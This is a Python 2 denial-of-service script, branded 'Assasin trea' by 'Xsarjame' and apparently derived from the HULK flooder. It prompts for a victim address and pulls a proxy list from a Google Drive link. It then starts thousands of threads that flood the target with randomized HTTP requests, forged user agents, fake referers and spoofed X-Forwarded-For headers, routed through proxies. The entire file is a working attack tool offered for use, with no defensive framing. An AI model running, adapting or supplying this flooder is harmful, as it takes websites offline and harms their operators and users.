#!/usr/bin/env python
#coding: Xsarjame
#..:: > assasin trea < ::.. Xsarjame :v

import random
import socket
import threading
import time
import datetime
import urllib2
import urllib
import re
import sys
import optparse
import os
import urlparse

#assasin trea Xsarjame :v
url=''
host=''
headers_useragents=[]
headers_referers=[]
keyword_top=[]
request_counter=0
flag=0
safe=0
def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val
	
def set_safe():
	global safe
	safe=1

def getUserAgent():
    platform = random.choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os  = random.choice(['68K', 'PPC'])
    elif platform == 'Windows':
        os  = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE', 'Windows 7', 'Windows 8'])
    elif platform == 'X11':
        os  = random.choice(['Linux i686', 'Linux x86_64'])
    browser = random.choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(random.randint(500, 599))
        version = str(random.randint(0, 28)) + '.0' + str(random.randint(0, 1500)) + '.' + str(random.randint(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    elif browser == 'firefox':
        currentYear = datetime.date.today().year
        year = str(random.randint(2000, currentYear))
        month = random.randint(1, 12)
        if month < 10:
            month = '0' + str(month)
        else:
            month = str(month)
        day = random.randint(1, 30)
        if day < 10:
            day = '0' + str(day)
        else:
            day = str(day)
        gecko = year + month + day
        version = str(random.randint(1, 21)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
    elif browser == 'ie':
        version = str(random.randint(1, 10)) + '.0'
        engine = str(random.randint(1, 5)) + '.0'
        option = random.choice([True, False])
        if option == True:
            token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
        else:
            token = ''
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

def referer_list():

	global headers_referers
        headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
        headers_referers.append('https://l.facebook.com/l.php?u=https://l.facebook.com/l.php?u=')
        headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
        headers_referers.append('http://help.baidu.com/searchResult?keywords=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('https://www.google.com.vn/?gws_rd=ssl#q=')
        headers_referers.append('http://yandex.ru/yandsearch?text=')
        headers_referers.append('http://vk.com/profile.php?redirect=')
        headers_referers.append('http://www.usatoday.com/search/results?q=')
        headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
        headers_referers.append('http://www.ask.com/web?q=')
        headers_referers.append('http://search.aol.com/aol/search?q=')
        headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
        headers_referers.append('http://host-tracker.com/check_page/?furl=')
        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('https://steamcommunity.com/market/search?q=')
        headers_referers.append('http://filehippo.com/search?q=')
        headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
        headers_referers.append('http://eu.battle.net/wow/en/search?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('http://careers.gatesfoundation.org/search?q=')
        headers_referers.append('http://techtv.mit.edu/search?q=')
        headers_referers.append('http://www.ustream.tv/search?q=')
        headers_referers.append('http://www.ted.com/search?q=')
        headers_referers.append('http://funnymama.com/search?q=')
        headers_referers.append('http://itch.io/search?q=')
        headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
        headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
        headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
        headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
        headers_referers.append('http://www.reddit.com/search?q=')
        headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
        headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
        headers_referers.append('http://jobs.leidos.com/search?q=')
        headers_referers.append('http://jobs.bloomberg.com/search?q=')
        headers_referers.append('https://www.pinterest.com/search/?q=')
        headers_referers.append('http://millercenter.org/search?q=')
        headers_referers.append('https://www.npmjs.com/search?q=')
        headers_referers.append('http://www.evidence.nhs.uk/search?q=')
        headers_referers.append('http://regex.info/exif.cgi?dummy=on&imgurl=')
        headers_referers.append('http://translate.google.com/translate?u=')
        headers_referers.append('http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=')
        headers_referers.append('http://validator.w3.org/check?uri=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
        headers_referers.append('http://validator.w3.org/checklink?uri=')
        headers_referers.append('http://www.w3.org/RDF/Validator/ARPServlet?URI=')
        headers_referers.append('http://validator.w3.org/mobile/check?docAddr=')
        headers_referers.append('http://validator.w3.org/p3p/20020128/p3p.pl?uri=')
        headers_referers.append('http://online.htmlvalidator.com/php/onlinevallite.php?url=')
        headers_referers.append('http://feedvalidator.org/check.cgi?url=')
        headers_referers.append('http://gmodules.com/ig/creator?url=')
        headers_referers.append('http://www.google.com/ig/adde?moduleurl=')
        headers_referers.append('http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=')
        headers_referers.append('http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=')
        headers_referers.append('http://host-tracker.com/check_page/?furl=')
        headers_referers.append('http://streamitwebseries.twww.tv/proxy.php?url=')
	headers_referers.append('https://duckduckgo.com/?q=')
        headers_referers.append('http://www.ask.com/web?q=')
        headers_referers.append('http://search.aol.com/aol/search?q=')
        headers_referers.append('https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=')
        headers_referers.append('https://www.facebook.com/search/results/?init=quick&q=')
        headers_referers.append('http://blekko.com/#ws/?q=')
        headers_referers.append('http://www.infomine.com/search/?q=')
        headers_referers.append('https://twitter.com/search?q=')
        headers_referers.append('http://www.wolframalpha.com/input/?i=')
        headers_referers.append('http://host-tracker.com/check_page/?furl=')
        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
        headers_referers.append('http://nova.rambler.ru/search?query=')
        headers_referers.append('https://ru.wikipedia.org/w/index.php?search=')
        headers_referers.append('https://search.yahoo.com/search?p=')
        headers_referers.append('http://go.mail.ru/search?q=')
        headers_referers.append('https://www.google.ru/?gws_rd=ssl#newwindow=1&q=')
        headers_referers.append('http://www.ask.com/web?q=')
        headers_referers.append('http://search.aol.com/aol/search?q=')
        headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
        headers_referers.append('http://host-tracker.com/check_page/?furl=')
        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('https://steamcommunity.com/market/search?q=')
        headers_referers.append('http://filehippo.com/search?q=')
        headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
        headers_referers.append('http://eu.battle.net/wow/en/search?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('http://careers.gatesfoundation.org/search?q=')
        headers_referers.append('http://techtv.mit.edu/search?q=')
        headers_referers.append('http://www.ustream.tv/search?q=')
        headers_referers.append('http://www.ted.com/search?q=')
        headers_referers.append('http://funnymama.com/search?q=')
        headers_referers.append('http://itch.io/search?q=')
        headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
        headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
        headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
        headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
        headers_referers.append('http://www.reddit.com/search?q=')
        headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
        headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
        headers_referers.append('http://jobs.leidos.com/search?q=')
        headers_referers.append('http://jobs.bloomberg.com/search?q=')
        headers_referers.append('https://www.pinterest.com/search/?q=')
        headers_referers.append('http://millercenter.org/search?q=')
        headers_referers.append('https://www.npmjs.com/search?q=')
        headers_referers.append('http://www.evidence.nhs.uk/search?q=')
        headers_referers.append('https://www.shodan.io/search?query=')
        headers_referers.append('https://www.google.fr/?gws_rd=ssl#q=')
        headers_referers.append('https://www.facebook.com/search/results/?init=quick&q=')
        headers_referers.append('https://www.google.com.ph/#q=')
        headers_referers.append('http://vi.wiktionary.org/w/index.php?search=')
        headers_referers.append('http://en.wiktionary.org/w/index.php?search=')
	headers_referers.append('https://bigfuture.collegeboard.org/sitesearch?q=')
        headers_referers.append('http://dictionary.reference.com/browse/as?s=')
        headers_referers.append('https://www.facebook.com/search/results/?init=quick&q=')
	headers_referers.append('http://blekko.com/#ws/?q=')
	headers_referers.append('http://www.infomine.com/search/?q=')
	headers_referers.append('https://twitter.com/search?q=')
	headers_referers.append('http://www.wolframalpha.com/input/?i=')
	headers_referers.append('http://host-tracker.com/check_page/?furl=')
	headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
	headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
        headers_referers.append('http://www.lynda.com/search?q=')
	headers_referers.append('https://www.flickr.com/search/?q=')
	headers_referers.append('http://steamcommunity.com/market/search?q=')
	headers_referers.append('https://qrobe.it/search/?q=')
	headers_referers.append('https://soundcloud.com/search?q=')
	headers_referers.append('https://twitter.com/search?q=')
	headers_referers.append('https://www.freesound.org/search/?q=')
	headers_referers.append('https://www.apple.com/search/?q=')
	headers_referers.append('https://www.google.co.in/#q=')
	headers_referers.append('https://www.google.com.au/#q=')
	headers_referers.append('http://www.bbc.co.uk/iplayer/search?q=')
	headers_referers.append('https://www.google.co.nz/#q=')
	headers_referers.append('https://luarocks.org/search?q=mjolnir?q=')
	headers_referers.append('http://journals.aps.org/search?q=')
	headers_referers.append('https://www.google.ru/webhp?hl=ru&newwindow=1&ei=YCJrVdTMNs6LuwT3kIC4Cg#newwindow=1&hl=ru&q=')
	headers_referers.append('http://search.iminent.com/es-ES/search/#q=')
	return(headers_referers)

def keyword_list():
	global keyword_top
	keyword_top.append('Anonymous')	
	keyword_top.append('sex')
        keyword_top.append('World Cup')
        keyword_top.append('Singer')
        keyword_top.append('ISIS')
	keyword_top.append('Facebook')
        keyword_top.append('Robin Williams')
	keyword_top.append('World Cup')
	keyword_top.append('ca si le roi')
        keyword_top.append('Ebola?')
	keyword_top.append('Flappy Bird')
	keyword_top.append('Conchita Wurst')
        keyword_top.append('Frozen')
	keyword_top.append('iPhone')
	keyword_top.append('iPhone5')
	keyword_top.append('iPhone6')
	keyword_top.append('iPhone7')
        keyword_top.append('Samsung Galaxy S5')
	keyword_top.append('Nexus 6')
	keyword_top.append('Moto G')
	keyword_top.append('Samsung Note 4')
        keyword_top.append('LG G3')
	keyword_top.append('Xbox One')
        keyword_top.append('Apple Watch')
	keyword_top.append('Nokia X')
	keyword_top.append('Ipad Air')
	keyword_top.append('facebook')
	keyword_top.append('IPhone')
	keyword_top.append('Star War')
	keyword_top.append('Windows 10')
	keyword_top.append('Zens Phone')
        keyword_top.append('Son Tung M-TP')
	keyword_top.append('Viurs')
	keyword_top.append('RIP Face')
	keyword_top.append('tao quan')
	keyword_top.append('gia xang')
	keyword_top.append('Roll Royce')
	keyword_top.append('Hai VL')
	keyword_top.append('FIFA')
	keyword_top.append('Bill Gate')
	keyword_top.append('UFO')
    	keyword_top.append('Microsoft')
	keyword_top.append('Mark Zuckerberg')
        keyword_top.append('youtube')
        keyword_top.append('facebook')
        keyword_top.append('download')
        keyword_top.append('movies')
        keyword_top.append('google')
        keyword_top.append('streaming')
        keyword_top.append('hotmail')
        keyword_top.append('facebook login')
        keyword_top.append('internet')
        keyword_top.append('yahoo')
        keyword_top.append('madasfish')
        keyword_top.append('antivirus software')
        keyword_top.append('ebay')
        keyword_top.append('yahoo mail')
        keyword_top.append('craigslist')
        keyword_top.append('aot')
        keyword_top.append('paid to promote')
        keyword_top.append('dvd movies online')
        keyword_top.append('gmail')
        keyword_top.append('games')
        keyword_top.append('fb')
        keyword_top.append('internetreal')
        keyword_top.append('shopping')
        keyword_top.append('proxy dozer')
        keyword_top.append('amazon')
        keyword_top.append('jobs')
        keyword_top.append('video')
        keyword_top.append('promote')
        keyword_top.append('new')
        keyword_top.append('twitter')
        keyword_top.append('minecraft')
        keyword_top.append('paid to')
        keyword_top.append('free')
        keyword_top.append('earn cpcs')
        keyword_top.append('earn chi')
        keyword_top.append('netflix')
        keyword_top.append('videos')
        keyword_top.append('net')
        keyword_top.append('pulse')
        keyword_top.append('posted by')
        keyword_top.append('date you')
        keyword_top.append('news')
        keyword_top.append('this date')
        keyword_top.append('msn')
        keyword_top.append('dating')
        keyword_top.append('birthday gifts')
        keyword_top.append('cars')
        keyword_top.append('best100tattoos')
        keyword_top.append('walmart')
        keyword_top.append('lkckclckli1i')
        keyword_top.append('sports')
        keyword_top.append('software')
        keyword_top.append('music')
        keyword_top.append('the')
        keyword_top.append('email marketing')
        keyword_top.append('broadband')
        keyword_top.append('online')
        keyword_top.append('insurance')
        keyword_top.append('movie')
        keyword_top.append('tramadol')
        keyword_top.append('weight loss')
        keyword_top.append('chat')
        keyword_top.append('home')
        keyword_top.append('yahoo google')
        keyword_top.append('car insurance')
        keyword_top.append('face')
        keyword_top.append('spyware')
        keyword_top.append('you tube')
        keyword_top.append('free tv shows')
        keyword_top.append('downloads')
        keyword_top.append('google maps')
        keyword_top.append('websbiggest')
        keyword_top.append('macromedia flash player free download')
        keyword_top.append('m nova')
        keyword_top.append('facebook friends')
        keyword_top.append('phentermine')
        keyword_top.append('weather')
        keyword_top.append('watch online')
        keyword_top.append('medical insurance')
        keyword_top.append('dating websites')
        keyword_top.append('in')
        keyword_top.append('movies online')
        keyword_top.append('friv')
        keyword_top.append('search')
        keyword_top.append('alo')
        keyword_top.append('houses for rent by owner')
        keyword_top.append('of')
        keyword_top.append('internet marketing')
        keyword_top.append('blogging make money')
        keyword_top.append('make money blogging')
        keyword_top.append('game')
        keyword_top.append('movie2k')
        keyword_top.append('walmart stores')
        keyword_top.append('credit card')
        keyword_top.append('instagram')
        keyword_top.append('Insurance')
        keyword_top.append('Loans')
        keyword_top.append('Mortgage')
        keyword_top.append('Attorney')
        keyword_top.append('Credit')
        keyword_top.append('Lawyer')
        keyword_top.append('Donate')
        keyword_top.append('Degree')
        keyword_top.append('Hosting')
        keyword_top.append('Claim')
        keyword_top.append('Conference Call')
        keyword_top.append('Trading')
        keyword_top.append('Software')
        keyword_top.append('Recovery')
        keyword_top.append('Transfer')
        keyword_top.append('Classes')
        keyword_top.append('Rehab')
        keyword_top.append('Treatment')
        keyword_top.append('Cord Blood')
	return(keyword_top)

def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def httpcall(url):
	referer_list()
	Mod=0
	if url.count("?")>0:
		param_joiner = "&"
	else:
		param_joiner = "?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', getUserAgent())
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + host + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	
	print \
"""

                  /\    
                 / |\   
                / /\ \   
               / /  \ \  
              / /    \ |
             /_/      \_|
             \    '`    /
              )   ||   ( 
              |   ||   | 
              |   ||   | 
              |   ||   |
              |   ||   |
              |   ||   | 
              |   ||   | 
              |   ||   | 
              |   ||   | 
              |   ||   |
  /           |   ||   |           =
 /(           |   ||   |           )=
 |`\_         |   ||   |         _/'|
 |`. `-._     |   ||   |     _,-' ,'|
 (   ` . `-._ |  _--_  | _,-' , '   )
  `.._   ` . `-./.__.\.-' , '   _,-'
      `-._   ` | /  \ | '   _,-'
          `-._/ |_()_| \_,-'
       ___.-'   ______   `-,
      '-----.  |______|   /  I'm an assassin I was 
             \  ______   /   in fear and exhaustion in my 
             |  \>  </  /    heart. Soon my prior sins may hit me. I will offer blood to my
              \________/     weapon to save me. If one year has passed, I will be saved from the worst case.
              _]______[_    
              |        |     
              |________|
               ]______[#     
              |        |
              |________|     
              _]______[_     
              |        |     
              |________|    
              _]______[_
              |        |
              |________|
                ]____[
              .'      `.
              | <   >  |>
             <|   <   >| 
               `.____.'
                 V   V 
"""""""""
		 

	index = random.randint(0,len(listaproxy)-1)
	proxy = urllib2.ProxyHandler({'http':listaproxy[index]})
	opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
	urllib2.install_opener(opener)	
	try:
			urllib2.urlopen(request)
			if(flag==1): set_flag(0)
			if(Mod==500): Mod=0
	except urllib2.HTTPError, e:
			set_flag(1)
			Mod=500
			time.sleep(60)
	except urllib2.URLError, e:
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(Mod)

class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				Mod=httpcall(url)
				if (Mod==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				previous=request_counter
			if flag==2:
				print ''

#Hulk Fucked By CheXanh :v
def randomIp():
    random.seed()
    result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
    result = result + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
    return result

def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(2, 8)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]
class attacco(threading.Thread):
    def run(self):
    	referer_list()
        current = x
       
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')
 
        useragent = "User-Agent: " + getUserAgent() + "\r\n"
        forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
        referer   = "Referer: "+ random.choice(headers_referers) + url + "?r="+ str(random.randint(1, 1000)) +  "\r\n"
        httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"

        while nload:
        	time.sleep(1)
        	pass
           
        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(httprequest)
                try:
                    for i in xrange(4):
                        a.send(httprequest)
                except:
                    tts = 1
                    
            except:
                proxy = random.choice(listaproxy).split(':')

class attacco1(threading.Thread):
    def run(self):
        current = x
       
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')
 
        useragent = "User-Agent: " + getUserAgent() + "\r\n"
        forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
        httprequest = get_host + useragent + accept + forward + connection + "\r\n"

        while nload:
        	time.sleep(1)
        	pass           
        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(httprequest)
                try:
                    for i in xrange(4):
                        a.send(httprequest)
                except:
                    tts = 1 
                   
            except:
                proxy = random.choice(listaproxy).split(':')

#Main
print '\n\t..:: > By Xsarjame :v < ::..'
print '\t  ==> #~~ Assasin trea ddos ~~# <==  '
# Site
url = raw_input("Victim ip: ")
host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
#Proxy
proxyf = urllib.urlopen("https://350adf0c87a0387a8100df99cb67bc325c711efb.googledrive.com/host/0B03s85BjEAHVfkpJaVZKdDFnQ25VTEJsZE5FMzhwUjBOa1VLUFdtRDhSR01qenZ1M1hZMWs/yyy.txt").read()
listaproxy = proxyf.split('\n')
#So luong
thread = input("So luong (3000): ")
get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
accept = "Accept-Encoding: gzip, deflate\r\n"
connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
nload = 1
x = 0
print("\tAssasain trea DDOS Attack By xsarjame :v")
if url.count("/")==2:
    url = url + "/"
    m = re.search('http\://([^/]*)/?.*', url)
    host = m.group(1)
for x in xrange(int(thread + 1)):
    attacco().start()
    attacco1().start()
    time.sleep(0.002)
print "startAttacking..."
for x in xrange(501):
	t = HTTPThread()
	t.start()
t = MonitorThread()
t.start()
nload = 0
while not nload:
    time.sleep(1)
